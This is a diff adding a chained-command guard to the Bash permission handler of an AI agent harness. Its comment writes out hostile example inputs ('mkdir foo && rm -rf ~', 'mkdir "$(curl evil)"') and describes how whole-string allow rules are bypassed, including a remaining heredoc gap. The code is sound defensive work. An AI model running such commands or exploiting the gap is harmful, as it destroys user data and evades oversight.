@@ -23,7 +23,7 @@ from claude_agent_sdk.types import ToolPermissionContext
 
 from .guardrails import SessionGuardrails
 from .policy import evaluate, load_policy
-from .tier1 import is_tier1_auto_approve
+from .tier1 import is_tier1_auto_approve, is_tier3_dangerous
 from .transport import invoke_command
 from .types import (
     PilotConfig,
@@ -57,6 +57,69 @@ CanUseTool = Callable[
     [str, dict[str, Any], ToolPermissionContext],
     Awaitable[PermissionResult],
 ]
+
+
+# ── Chained-danger guard over policy Bash allow (claude-pilot#25) ────────────
+#
+# policy.evaluate() matches a single regex against the WHOLE command string
+# (policy.py first-match-wins) — it does NOT compound-split, run
+# is_tier3_dangerous, or scan for command-substitution metacharacters. Those
+# guards live only in tier1, which has already returned False to reach the
+# policy evaluator. Without this guard a policy `allow` rule on e.g. `^mkdir\s`
+# would also allow `mkdir foo && rm -rf ~` — the dangerous tail rides along the
+# allowed prefix. The same latent flaw affects the pre-existing groom-phase
+# rules (`git status && rm -rf ~` matches `^git\s+status`).
+#
+# Two vectors a whole-string allow regex cannot see:
+#   1. Command chaining a dangerous tail: ``mkdir foo && rm -rf ~`` — caught by
+#      re-applying tier1's ``is_tier3_dangerous`` (rm -rf, force-push, sed -i,
+#      redirect-to-file, etc.) over the full command.
+#   2. Command substitution: ``mkdir "$(curl evil)"`` — caught by forbidding
+#      ``$(``, backtick, and ``$'`` outright. This is DELIBERATELY stricter than
+#      tier1's quote-aware ``contains_unquoted_metacharacter`` (which ignores
+#      substitution inside double quotes, mirroring the Rust pre-classifier —
+#      mika#944/#946). The new dev-pilot rules are write-capable (mkdir/cp/rm),
+#      so a policy-allowed command never legitimately needs substitution; any
+#      that does must go through the relay, not the deterministic allow path.
+#
+# Heredoc exemption: the pre-existing ``bash-cat-heredoc-tmp`` rule deliberately
+# allows a ``/tmp``-scoped ``cat >`` heredoc whose body is inert data and may
+# legitimately contain redirects, ``rm``, or ``$(...)`` as literal script text.
+# Running the tier3/substitution scan over it would re-deny exactly what that
+# rule exists to permit (tier1 already rejected the redirect — that is *why* the
+# policy rule is there). So a heredoc is exempt ONLY when it is the sole
+# top-level command (no chaining operator before ``<<``); ``mkdir x && rm -rf ~
+# <<X`` is therefore NOT exempt and still gets the full scan. Residual: a
+# command chained *after* the heredoc terminator is not re-scanned — this is the
+# rule's pre-existing behavior, unchanged by this guard, tracked as follow-up.
+
+# Heredoc is the sole top-level command: starts with cat/tee, no &/;/| before <<.
+_SAFE_HEREDOC_RE = re.compile(r"^\s*(?:cat|tee)\b[^&;|]*<<")
+
+# Command-substitution markers forbidden on the non-heredoc policy-allow path.
+_SUBSTITUTION_MARKERS = ("$(", "`", "$'")
+
+
+def _bash_allow_is_chain_safe(tool_name: str, tool_input: dict[str, Any]) -> bool:
+    """Whether a policy ``allow`` decision is safe to honor.
+
+    Returns ``True`` for every non-Bash tool (nothing to scan). For Bash,
+    returns ``False`` when an allowed prefix is chained to a tier3-dangerous
+    tail or contains a command-substitution marker. A ``/tmp``-scoped
+    sole-command heredoc is exempt (see module comment above).
+    """
+    if tool_name != "Bash":
+        return True
+    command = tool_input.get("command", "")
+    if not isinstance(command, str):
+        return False
+    if _SAFE_HEREDOC_RE.search(command):
+        return True
+    if any(marker in command for marker in _SUBSTITUTION_MARKERS):
+        return False
+    if is_tier3_dangerous(command):
+        return False
+    return True
 
 
 def _fire_notify(tool_name: str, detail: str, reason: str) -> None:
@@ -115,6 +178,18 @@ def create_permission_handler(
             pd = evaluate(policy, tool_name, tool_input)
             detail = _summarize_input(tool_name, tool_input)
             if pd.decision == "allow":
+                # Chained-danger guard (claude-pilot#25): a policy allow rule
+                # matches a whole-command regex; veto it if a dangerous tail is
+                # chained onto the allowed prefix. Halt honestly (interrupt=True)
+                # like every other policy denial (cpp#20 joint 2).
+                if not _bash_allow_is_chain_safe(tool_name, tool_input):
+                    veto_reason = (
+                        f"policy allow ({pd.rule_id}) vetoed — command chains a "
+                        "tier3-dangerous or command-substitution tail onto the "
+                        "allowed prefix"
+                    )
+                    log_policy_deny(tool_name, detail, pd.rule_id)
+                    return PermissionResultDeny(message=veto_reason, interrupt=True)
                 log_policy_allow(tool_name, detail, pd.rule_id)
                 return PermissionResultAllow(updated_input=tool_input)
             if pd.decision == "deny":
